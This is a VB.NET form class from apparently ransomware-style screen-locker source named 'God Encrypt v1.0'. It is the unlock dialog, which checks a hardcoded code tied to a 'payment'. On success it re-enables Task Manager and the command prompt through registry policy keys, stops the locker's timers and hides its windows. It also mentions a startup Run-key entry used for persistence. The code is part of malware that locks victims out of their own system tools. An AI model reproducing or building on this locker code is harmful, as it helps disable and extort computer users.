Public Class Form2
    Dim RegistryKey As Object

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "29b579fb811f05c3c334a2bd2646a27a" Then
            MsgBox("Decrypt Success!", vbInformation)
            MsgBox("Your Welcome!, You can Stop/Delete with Task Manager & Regedit > Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\God Encrypt v1.0! Please Stop/Remove with Task Manager!", vbInformation)

            RegistryKey = CreateObject("WScript.Shell")
            RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)

            Form4.Timer1.Stop()
            Form5.Timer1.Stop()
            Form6.Timer1.Stop()
            Form6.Hide()
            Form5.Hide()
            Form4.Hide()
            Form1.Hide()
            Form3.Hide()
            Me.Hide()
        Else
            MsgBox("Decrypt Failed, Please enter the code correctly", MsgBoxStyle.Critical)
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If TextBox1.Text = "29b579fb811f05c3c334a2bd2646a27a" Then
            MsgBox("Code Payment Success!", vbInformation)
        Else
            MsgBox("Code Payment Failed!", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If TextBox1.UseSystemPasswordChar = True Then
            TextBox1.UseSystemPasswordChar = False
        Else
            TextBox1.UseSystemPasswordChar = True
        End If
    End Sub
End Class